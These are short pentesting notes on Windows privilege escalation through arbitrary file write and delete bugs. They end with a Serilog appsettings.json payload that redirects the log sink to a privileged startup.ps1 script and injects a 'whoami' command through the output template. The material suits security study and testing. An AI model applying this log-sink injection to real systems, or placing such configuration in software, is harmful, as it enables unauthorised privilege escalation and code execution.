# Arbitrary File Write
- Overwrite a file
- Drop a file where it can be used for DLL Hijacking
- We must be able to control the content or
- the file write shall mess the ACL and give over permissive ACL.
- if we can only control the filename then its maybe a Denial Of Service by overwriting system files.
> Common with log files

# Arbitrary File Delete
- Remove files that we can replace
* C:\ProgramData
* C:\Windows\Temp
> Default rights allow low privileged users to create files and directories but not to modify existing ones.

# Serilog.json/appsettings.json
{
  "Logging": {
    "LogLevel": {
      "Default": "Warning"
    }
  },
  "Installation": {
    "AgentType": "computer",
    "ApplicationDataPath": "C:\\ProgramData\\CustomApp"
  },
  "Serilog": {
    "Using": [ "Serilog.Sinks.File" ],
    "MinimumLevel": {
      "Default": "Warning"
    },
    "WriteTo": [
      {
        "Name": "File",
        "Args": {
          "path": "C:\\Program Files\\Highprivileged\\script\\startup.ps1",
          "rollingInterval": "Day",
          "shared": true,
          "outputTemplate": "{whoami >> C:\temp\test.txt#}"
        }
      }
    ]
  }
}




